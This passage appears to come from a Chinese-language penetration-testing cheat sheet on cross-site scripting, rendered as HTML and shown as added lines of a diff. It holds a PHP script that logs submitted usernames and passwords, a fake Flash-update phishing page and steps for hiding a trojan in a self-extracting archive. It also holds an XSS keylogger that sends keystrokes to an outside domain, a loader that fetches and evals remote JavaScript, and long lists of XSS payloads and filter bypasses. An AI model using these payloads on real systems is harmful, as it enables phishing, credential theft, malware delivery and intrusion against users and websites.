+      <span class="token variable">$user</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+      <span class="token variable">$pass</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+      <span class="token variable">$file</span><span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'pass.txt'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'a+'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+      <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token variable">$user</span><span class="token operator">.</span><span class="token string double-quoted-string">&quot;|&quot;</span><span class="token operator">.</span><span class="token string double-quoted-string">&quot;pass&quot;</span> <span class="token operator">.</span> <span class="token string double-quoted-string">&quot;\n&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+      <span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+      <span class="token keyword">echo</span> <span class="token string double-quoted-string">&quot;&lt;script&gt;window.location.href=\&quot;http://192.168.0.1\&quot;&lt;/script&gt;\n&quot;</span><span class="token punctuation">;</span>
+    <span class="token delimiter important">?&gt;</span></span>
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br></div></div><div class="language- extra-class"><pre><code>构造payload
+&lt;script&gt;window.location.href=&quot;http://192.168.0.1/login.html&quot;&lt;/script&gt;
+php –S 0.0.0.0:8080 –t ./
+</code></pre></div><h4 id="伪造页面钓鱼"><a href="#伪造页面钓鱼" class="header-anchor">#</a> 伪造页面钓鱼</h4> <div class="language- extra-class"><pre><code>方法1
+https://github.com/r00tSe7en/Fake-flash.cn
+添加xss平台模块
+window.alert = function(name){
+var iframe = document.createElement(&quot;IFRAME&quot;);
+iframe.style.display=&quot;none&quot;;
+iframe.setAttribute(&quot;src&quot;,'data:text/plain');
+document.documentElement.appendChild(iframe);
+window.frames[0].window.alert(name);
+iframe.parentNode.removeChild(iframe);
+}
+alert(&quot;您的FLASH版本过低，尝试升级后访问该页面！&quot;);
+window.location.href=&quot;http://www.flash.com&quot;;
+制作自解压捆绑
+一个马.exe，一个正常exe，全选，winrar添加到压缩文件，选择创建自解压格式压缩文件，高级-&gt;自解压选项，设置解压路径，c:\windows\temp\，设置-&gt;解压后运行两个exe文件，模式全部隐藏，更新，解压并更新文件，覆盖所有文件。
+ResourceHacker修改文件图标
+方法2
+if(empty($_COOKIE['flash'])){
+	    echo '&lt;script&gt;alert(&quot;你当前计算机的Flash软件已经很久未更新，将导致无法正常显示界面内容，请下载安装最新版本！&quot;);window.location=&quot;http://www.flash.cn.xx.com/&quot;&lt;/script&gt;';
+	    setcookie(&quot;flash&quot;,&quot;true&quot;,time()+30*2400);
+}
+</code></pre></div><h4 id="键盘记录"><a href="#键盘记录" class="header-anchor">#</a> 键盘记录</h4> <div class="language- extra-class"><pre><code>&lt;img src=x onerror='document.onkeypress=function(e){fetch(&quot;http://domain.com?k=&quot;+String.fromCharCode(e.which))},this.remove();'&gt;
+</code></pre></div><h4 id="更多payload"><a href="#更多payload" class="header-anchor">#</a> 更多PAYLOAD</h4> <div class="language- extra-class"><pre><code>http://www.xss-payloads.com/payloads-list.html?a#category=all
+</code></pre></div><h4 id="更多xss盲打工具"><a href="#更多xss盲打工具" class="header-anchor">#</a> 更多XSS盲打工具</h4> <div class="language- extra-class"><pre><code>https://github.com/s0md3v/XSStrike
+https://github.com/epsylon/xsser
+https://github.com/hahwul/dalfox
+https://github.com/hahwul/XSpear
+https://github.com/fcavallarin/domdig
+</code></pre></div><h4 id="常见payload"><a href="#常见payload" class="header-anchor">#</a> 常见payload</h4> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token comment">// Basic payload</span>
+<span class="token operator">&lt;</span>script<span class="token operator">&gt;</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'XSS'</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span>
+<span class="token operator">&lt;</span>scr<span class="token operator">&lt;</span>script<span class="token operator">&gt;</span>ipt<span class="token operator">&gt;</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'XSS'</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>scr<span class="token operator">&lt;</span>script<span class="token operator">&gt;</span>ipt<span class="token operator">&gt;</span>
+&quot;<span class="token operator">&gt;</span><span class="token operator">&lt;</span>script<span class="token operator">&gt;</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'XSS'</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span>
+&quot;<span class="token operator">&gt;</span><span class="token operator">&lt;</span>script<span class="token operator">&gt;</span><span class="token function">alert</span><span class="token punctuation">(</span>String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span><span class="token number">88</span><span class="token punctuation">,</span><span class="token number">83</span><span class="token punctuation">,</span><span class="token number">83</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span>
+<span class="token operator">&lt;</span>script<span class="token operator">&gt;</span>\<span class="token function">u0061lert</span><span class="token punctuation">(</span><span class="token string">'22'</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span>
+<span class="token operator">&lt;</span>script<span class="token operator">&gt;</span><span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">'\x61lert(\'33\')'</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span>
+<span class="token operator">&lt;</span>script<span class="token operator">&gt;</span><span class="token function">eval</span><span class="token punctuation">(</span><span class="token number">8680439.</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">983801.</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">36</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span> <span class="token comment">//parseInt(&quot;confirm&quot;,30) == 8680439 &amp;&amp; 8680439..toString(30) == &quot;confirm&quot;</span>
+<span class="token operator">&lt;</span>object<span class="token operator">/</span>data<span class="token operator">=</span><span class="token string">&quot;jav&amp;#x61;sc&amp;#x72;ipt&amp;#x3a;al&amp;#x65;rt&amp;#x28;23&amp;#x29;&quot;</span><span class="token operator">&gt;</span>
+
+<span class="token comment">// Img payload</span>
+<span class="token operator">&lt;</span>img src<span class="token operator">=</span>x onerror<span class="token operator">=</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'XSS'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&gt;</span>
+<span class="token operator">&lt;</span>img src<span class="token operator">=</span>x onerror<span class="token operator">=</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'XSS'</span><span class="token punctuation">)</span><span class="token comment">//</span>
+<span class="token operator">&lt;</span>img src<span class="token operator">=</span>x onerror<span class="token operator">=</span><span class="token function">alert</span><span class="token punctuation">(</span>String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span><span class="token number">88</span><span class="token punctuation">,</span><span class="token number">83</span><span class="token punctuation">,</span><span class="token number">83</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&gt;</span>
+<span class="token operator">&lt;</span>img src<span class="token operator">=</span>x oneonerrorrror<span class="token operator">=</span><span class="token function">alert</span><span class="token punctuation">(</span>String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span><span class="token number">88</span><span class="token punctuation">,</span><span class="token number">83</span><span class="token punctuation">,</span><span class="token number">83</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&gt;</span>
+<span class="token operator">&lt;</span>img src<span class="token operator">=</span>x<span class="token operator">:</span><span class="token function">alert</span><span class="token punctuation">(</span>alt<span class="token punctuation">)</span> onerror<span class="token operator">=</span><span class="token function">eval</span><span class="token punctuation">(</span>src<span class="token punctuation">)</span> alt<span class="token operator">=</span>xss<span class="token operator">&gt;</span>
+&quot;<span class="token operator">&gt;</span><span class="token operator">&lt;</span>img src<span class="token operator">=</span>x onerror<span class="token operator">=</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'XSS'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&gt;</span>
+&quot;<span class="token operator">&gt;</span><span class="token operator">&lt;</span>img src<span class="token operator">=</span>x onerror<span class="token operator">=</span><span class="token function">alert</span><span class="token punctuation">(</span>String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span><span class="token number">88</span><span class="token punctuation">,</span><span class="token number">83</span><span class="token punctuation">,</span><span class="token number">83</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&gt;</span>
+
+<span class="token comment">// Svg payload</span>
+<span class="token operator">&lt;</span>svgonload<span class="token operator">=</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">&gt;</span>
+<span class="token operator">&lt;</span>svg<span class="token operator">/</span>onload<span class="token operator">=</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'XSS'</span><span class="token punctuation">)</span><span class="token operator">&gt;</span>
+<span class="token operator">&lt;</span>svg onload<span class="token operator">=</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">//</span>
+<span class="token operator">&lt;</span>svg<span class="token operator">/</span>onload<span class="token operator">=</span><span class="token function">alert</span><span class="token punctuation">(</span>String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span><span class="token number">88</span><span class="token punctuation">,</span><span class="token number">83</span><span class="token punctuation">,</span><span class="token number">83</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&gt;</span>
+<span class="token operator">&lt;</span>svg id<span class="token operator">=</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> onload<span class="token operator">=</span><span class="token function">eval</span><span class="token punctuation">(</span>id<span class="token punctuation">)</span><span class="token operator">&gt;</span>
+&quot;<span class="token operator">&gt;</span><span class="token operator">&lt;</span>svg<span class="token operator">/</span>onload<span class="token operator">=</span><span class="token function">alert</span><span class="token punctuation">(</span>String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span><span class="token number">88</span><span class="token punctuation">,</span><span class="token number">83</span><span class="token punctuation">,</span><span class="token number">83</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&gt;</span>
+&quot;<span class="token operator">&gt;</span><span class="token operator">&lt;</span>svg<span class="token operator">/</span>onload<span class="token operator">=</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">XSS</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">)</span>
+<span class="token operator">&lt;</span>svg<span class="token operator">&gt;</span><span class="token operator">&lt;</span>script href<span class="token operator">=</span>data<span class="token operator">:</span><span class="token punctuation">,</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">/</span><span class="token operator">&gt;</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">Firefox</span><span class="token template-punctuation string">`</span></span> is the only browser which allows self closing script<span class="token punctuation">)</span>
+<span class="token operator">&lt;</span>svg<span class="token operator">&gt;</span><span class="token operator">&lt;</span>script<span class="token operator">&gt;</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'33'</span><span class="token punctuation">)</span>
+<span class="token operator">&lt;</span>svg<span class="token operator">&gt;</span><span class="token operator">&lt;</span>script<span class="token operator">&gt;</span>alert<span class="token operator">&amp;</span>lpar<span class="token punctuation">;</span><span class="token string">'33'</span><span class="token operator">&amp;</span>rpar<span class="token punctuation">;</span>
+
+<span class="token comment">// Div payload</span>
+<span class="token operator">&lt;</span>div onpointerover<span class="token operator">=</span><span class="token string">&quot;alert(45)&quot;</span><span class="token operator">&gt;</span><span class="token constant">MOVE</span> <span class="token constant">HERE</span><span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">&gt;</span>
+<span class="token operator">&lt;</span>div onpointerdown<span class="token operator">=</span><span class="token string">&quot;alert(45)&quot;</span><span class="token operator">&gt;</span><span class="token constant">MOVE</span> <span class="token constant">HERE</span><span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">&gt;</span>
+<span class="token operator">&lt;</span>div onpointerenter<span class="token operator">=</span><span class="token string">&quot;alert(45)&quot;</span><span class="token operator">&gt;</span><span class="token constant">MOVE</span> <span class="token constant">HERE</span><span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">&gt;</span>
+<span class="token operator">&lt;</span>div onpointerleave<span class="token operator">=</span><span class="token string">&quot;alert(45)&quot;</span><span class="token operator">&gt;</span><span class="token constant">MOVE</span> <span class="token constant">HERE</span><span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">&gt;</span>
+<span class="token operator">&lt;</span>div onpointermove<span class="token operator">=</span><span class="token string">&quot;alert(45)&quot;</span><span class="token operator">&gt;</span><span class="token constant">MOVE</span> <span class="token constant">HERE</span><span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">&gt;</span>
+<span class="token operator">&lt;</span>div onpointerout<span class="token operator">=</span><span class="token string">&quot;alert(45)&quot;</span><span class="token operator">&gt;</span><span class="token constant">MOVE</span> <span class="token constant">HERE</span><span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">&gt;</span>
+<span class="token operator">&lt;</span>div onpointerup<span class="token operator">=</span><span class="token string">&quot;alert(45)&quot;</span><span class="token operator">&gt;</span><span class="token constant">MOVE</span> <span class="token constant">HERE</span><span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">&gt;</span>
+<span class="token operator">&lt;</span>body onload<span class="token operator">=</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">XSS</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">.</span>source<span class="token punctuation">)</span><span class="token operator">&gt;</span>
+<span class="token operator">&lt;</span>input autofocus onfocus<span class="token operator">=</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">&gt;</span>
+<span class="token operator">&lt;</span>select autofocus onfocus<span class="token operator">=</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">&gt;</span>
+<span class="token operator">&lt;</span>textarea autofocus onfocus<span class="token operator">=</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">&gt;</span>
+<span class="token operator">&lt;</span>keygen autofocus onfocus<span class="token operator">=</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">&gt;</span>
+<span class="token operator">&lt;</span>video<span class="token operator">/</span>poster<span class="token operator">/</span>onerror<span class="token operator">=</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">&gt;</span>
+<span class="token operator">&lt;</span>video<span class="token operator">&gt;</span><span class="token operator">&lt;</span>source onerror<span class="token operator">=</span><span class="token string">&quot;javascript:alert(1)&quot;</span><span class="token operator">&gt;</span>
+<span class="token operator">&lt;</span>video src<span class="token operator">=</span>_ onloadstart<span class="token operator">=</span><span class="token string">&quot;alert(1)&quot;</span><span class="token operator">&gt;</span>
+<span class="token operator">&lt;</span>details<span class="token operator">/</span>open<span class="token operator">/</span>ontoggle<span class="token operator">=</span><span class="token string">&quot;alert`1`&quot;</span><span class="token operator">&gt;</span>
+<span class="token operator">&lt;</span>audio src onloadstart<span class="token operator">=</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">&gt;</span>
+<span class="token operator">&lt;</span>marquee onstart<span class="token operator">=</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">&gt;</span>
+<span class="token operator">&lt;</span>meter value<span class="token operator">=</span><span class="token number">2</span> min<span class="token operator">=</span><span class="token number">0</span> max<span class="token operator">=</span><span class="token number">10</span> onmouseover<span class="token operator">=</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">&gt;</span><span class="token number">2</span> out <span class="token keyword">of</span> <span class="token number">10</span><span class="token operator">&lt;</span><span class="token operator">/</span>meter<span class="token operator">&gt;</span>
+
+<span class="token operator">&lt;</span>body ontouchstart<span class="token operator">=</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">&gt;</span> <span class="token comment">// 当手指触摸屏幕时触发</span>
+<span class="token operator">&lt;</span>body ontouchend<span class="token operator">=</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">&gt;</span>   <span class="token comment">// 当手指从触摸屏上移开时触发</span>
+<span class="token operator">&lt;</span>body ontouchmove<span class="token operator">=</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">&gt;</span>  <span class="token comment">// 当手指在屏幕上拖动时</span>
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br><span class="line-number">47</span><br><span class="line-number">48</span><br><span class="line-number">49</span><br><span class="line-number">50</span><br><span class="line-number">51</span><br><span class="line-number">52</span><br><span class="line-number">53</span><br><span class="line-number">54</span><br><span class="line-number">55</span><br></div></div><h4 id="远程js"><a href="#远程js" class="header-anchor">#</a> 远程Js</h4> <div class="language- extra-class"><pre><code>&lt;svg/onload='fetch(&quot;//host/a&quot;).then(r=&gt;r.text().then(t=&gt;eval(t)))'&gt;
+&lt;script src=14.rs&gt;
+</code></pre></div><h4 id="隐藏在输入框中的-xss"><a href="#隐藏在输入框中的-xss" class="header-anchor">#</a> 隐藏在输入框中的 XSS</h4> <div class="language- extra-class"><pre><code>&lt;input type=&quot;hidden&quot; accesskey=&quot;X&quot; onclick=&quot;alert(1)&quot;&gt;
+使用CTRL+SHIFT+X触发
+</code></pre></div><h4 id="带有-javascript-的-xss"><a href="#带有-javascript-的-xss" class="header-anchor">#</a> 带有 JavaScript 的 XSS</h4> <div class="language- extra-class"><pre><code>javascript:prompt(1)
+
+%26%23106%26%2397%26%23118%26%2397%26%23115%26%2399%26%23114%26%23105%26%23112%26%23116%26%2358%26%2399%26%23111%26%23110%26%23102%26%23105%26%23114%26%23109%26%2340%26%2349%26%2341
+
+&amp;#106&amp;#97&amp;#118&amp;#97&amp;#115&amp;#99&amp;#114&amp;#105&amp;#112&amp;#116&amp;#58&amp;#99&amp;#111&amp;#110&amp;#102&amp;#105&amp;#114&amp;#109&amp;#40&amp;#49&amp;#41
+
+\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3aalert(1)
+\u006A\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074\u003aalert(1)
+\152\141\166\141\163\143\162\151\160\164\072alert(1)
+
+java%0ascript:alert(1)   - LF (\n)
+java%09script:alert(1)   - Horizontal tab (\t)
+java%0dscript:alert(1)   - CR (\r)
+
+\j\av\a\s\cr\i\pt\:\a\l\ert\(1\)
+
+javascript://%0Aalert(1)
+javascript://anything%0D%0A%0D%0Awindow.alert(1)
+</code></pre></div><h4 id="带有data的-xss"><a href="#带有data的-xss" class="header-anchor">#</a> 带有data的 XSS</h4> <div class="language- extra-class"><pre><code>data:text/html,&lt;script&gt;alert(0)&lt;/script&gt;
+data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+
+&lt;script src=&quot;data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ==&quot;&gt;&lt;/script&gt;
+</code></pre></div><h4 id="文件中的-xss"><a href="#文件中的-xss" class="header-anchor">#</a> 文件中的 XSS</h4> <h5 id="xml-cdata"><a href="#xml-cdata" class="header-anchor">#</a> XML CDATA</h5> <div class="language- extra-class"><pre><code>&lt;name&gt;
+  &lt;value&gt;&lt;![CDATA[&lt;script&gt;confirm(document.domain)&lt;/script&gt;]]&gt;&lt;/value&gt;
+&lt;/name&gt;
+</code></pre></div><h5 id="xml-中的-xss"><a href="#xml-中的-xss" class="header-anchor">#</a> XML 中的 XSS</h5> <div class="language- extra-class"><pre><code>&lt;html&gt;
+&lt;head&gt;&lt;/head&gt;
+&lt;body&gt;
+&lt;something:script xmlns:something=&quot;http://www.w3.org/1999/xhtml&quot;&gt;alert(1)&lt;/something:script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre></div><h5 id="svg-中的-xss"><a href="#svg-中的-xss" class="header-anchor">#</a> SVG 中的 XSS</h5> <div class="language- extra-class"><pre><code>&lt;?xml version=&quot;1.0&quot; standalone=&quot;no&quot;?&gt;
+&lt;!DOCTYPE svg PUBLIC &quot;-//W3C//DTD SVG 1.1//EN&quot; &quot;http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd&quot;&gt;
+
+&lt;svg version=&quot;1.1&quot; baseProfile=&quot;full&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot;&gt;
+  &lt;polygon id=&quot;triangle&quot; points=&quot;0,0 0,50 50,0&quot; fill=&quot;#009900&quot; stroke=&quot;#004400&quot;/&gt;
+  &lt;script type=&quot;text/javascript&quot;&gt;
+    alert(document.domain);
+  &lt;/script&gt;
+&lt;/svg&gt;
+</code></pre></div><h5 id="svg-中的-xss-短"><a href="#svg-中的-xss-短" class="header-anchor">#</a> SVG 中的 XSS（短）</h5> <div class="language- extra-class"><pre><code>&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; onload=&quot;alert(document.domain)&quot;/&gt;
+
+&lt;svg&gt;&lt;desc&gt;&lt;![CDATA[&lt;/desc&gt;&lt;script&gt;alert(1)&lt;/script&gt;]]&gt;&lt;/svg&gt;
+&lt;svg&gt;&lt;foreignObject&gt;&lt;![CDATA[&lt;/foreignObject&gt;&lt;script&gt;alert(2)&lt;/script&gt;]]&gt;&lt;/svg&gt;
+&lt;svg&gt;&lt;title&gt;&lt;![CDATA[&lt;/title&gt;&lt;script&gt;alert(3)&lt;/script&gt;]]&gt;&lt;/svg&gt;
+</code></pre></div><h5 id="markdown-中的-xss"><a href="#markdown-中的-xss" class="header-anchor">#</a> Markdown 中的 XSS</h5> <div class="language- extra-class"><pre><code>[a](javascript:prompt(document.cookie))
+[a](j a v a s c r i p t:prompt(document.cookie))
+[a](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)
+[a](javascript:window.onerror=alert;throw%201)
+</code></pre></div><h5 id="swf-flash-应用程序中的-xss"><a href="#swf-flash-应用程序中的-xss" class="header-anchor">#</a> SWF flash 应用程序中的 XSS</h5> <div class="language- extra-class"><pre><code>http://0me.me/demo/xss/xssproject.swf?js=alert(document.domain);
+IE8: http://0me.me/demo/xss/xssproject.swf?js=try{alert(document.domain)}catch(e){ window.open(‘?js=history.go(-1)’,’_self’);}
+IE9: http://0me.me/demo/xss/xssproject.swf?js=w=window.open(‘invalidfileinvalidfileinvalidfile’,’target’);setTimeout(‘alert(w.document.location);w.close();’,1);
+
+flashmediaelement.swf?jsinitfunctio%gn=alert`1`
+flashmediaelement.swf?jsinitfunctio%25gn=alert(1)
+ZeroClipboard.swf?id=\&quot;))} catch(e) {alert(1);}//&amp;width=1000&amp;height=1000
+swfupload.swf?movieName=&quot;]);}catch(e){}if(!self.a)self.a=!alert(1);//
+swfupload.swf?buttonText=test&lt;a href=&quot;javascript:confirm(1)&quot;&gt;&lt;img src=&quot;https://web.archive.org/web/20130730223443im_/http://appsec.ws/ExploitDB/cMon.jpg&quot;/&gt;&lt;/a&gt;&amp;.swf
+plupload.flash.swf?%#target%g=alert&amp;uid%g=XSS&amp;
+moxieplayer.swf?url=https://github.com/phwd/poc/blob/master/vid.flv?raw=true
+video-js.swf?readyFunction=alert(1)
+player.swf?playerready=alert(document.cookie)
+player.swf?tracecall=alert(document.cookie)
+banner.swf?clickTAG=javascript:alert(1);//
+io.swf?yid=\&quot;));}catch(e){alert(1);}//
+video-js.swf?readyFunction=alert%28document.domain%2b'%20XSSed!'%29
+bookContent.swf?currentHTMLURL=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4
+flashcanvas.swf?id=test\&quot;));}catch(e){alert(document.domain)}//
+phpmyadmin/js/canvg/flashcanvas.swf?id=test\”));}catch(e){alert(document.domain)}//
+</code></pre></div><h5 id="css-中的-xss"><a href="#css-中的-xss" class="header-anchor">#</a> CSS 中的 XSS</h5> <div class="language- extra-class"><pre><code>&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+&lt;style&gt;
+div  {
+    background-image: url(&quot;data:image/jpg;base64,&lt;\/style&gt;&lt;svg/onload=alert(document.domain)&gt;&quot;);
+    background-color: #cccccc;
+}
+&lt;/style&gt;
+&lt;/head&gt;
+  &lt;body&gt;
+    &lt;div&gt;lol&lt;/div&gt;
+  &lt;/body&gt;
+&lt;/html&gt;
+</code></pre></div><h4 id="绕过过滤"><a href="#绕过过滤" class="header-anchor">#</a> 绕过过滤</h4> <h5 id="大小写"><a href="#大小写" class="header-anchor">#</a> 大小写</h5> <div class="language- extra-class"><pre><code>&lt;sCrIpt&gt;alert(1)&lt;/ScRipt&gt;
+</code></pre></div><h5 id="标签黑名单"><a href="#标签黑名单" class="header-anchor">#</a> 标签黑名单</h5> <div class="language- extra-class"><pre><code>&lt;script x&gt;
+&lt;script x&gt;alert('XSS')&lt;script y&gt;
+</code></pre></div><h5 id="转义"><a href="#转义" class="header-anchor">#</a> 转义</h5> <div class="language- extra-class"><pre><code>eval('ale'+'rt(0)');
+Function(&quot;ale&quot;+&quot;rt(1)&quot;)();
+new Function`al\ert\`6\``;
+setTimeout('ale'+'rt(2)');
+setInterval('ale'+'rt(10)');
+Set.constructor('ale'+'rt(13)')();
+Set.constructor`al\x65rt\x2814\x29```;
+</code></pre></div><h5 id="使用不完整的-html-标签"><a href="#使用不完整的-html-标签" class="header-anchor">#</a> 使用不完整的 html 标签</h5> <div class="language- extra-class"><pre><code>&lt;img src='1' onerror='alert(0)' &lt;
+</code></pre></div><h5 id="字符串引号"><a href="#字符串引号" class="header-anchor">#</a> 字符串引号</h5> <div class="language- extra-class"><pre><code>String.fromCharCode(88,83,83)
+</code></pre></div><h5 id="标签中的引号"><a href="#标签中的引号" class="header-anchor">#</a> 标签中的引号</h5> <div class="language- extra-class"><pre><code>http://localhost/bla.php?test=&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;
+&lt;html&gt;
+  &lt;script&gt;
+    &lt;?php echo 'foo=&quot;text '.$_GET['test'].'&quot;;';`?&gt;
+  &lt;/script&gt;
+&lt;/html&gt;
+</code></pre></div><h5 id="在-mousedown-事件中绕过引号"><a href="#在-mousedown-事件中绕过引号" class="header-anchor">#</a> 在 mousedown 事件中绕过引号</h5> <div class="language- extra-class"><pre><code>&lt;a href=&quot;&quot; onmousedown=&quot;var name = '&amp;#39;;alert(1)//'; alert('smthg')&quot;&gt;Link&lt;/a&gt;
+</code></pre></div><h5 id="绕过-点-过滤"><a href="#绕过-点-过滤" class="header-anchor">#</a> 绕过“点”过滤</h5> <div class="language- extra-class"><pre><code>&lt;script&gt;window['alert'](document['domain'])&lt;/script&gt;
+IP地址转换为十进制格式
+http://www.geektools.com/cgi-bin/ipconv.cgi
+http://192.168.1.1== http://3232235777
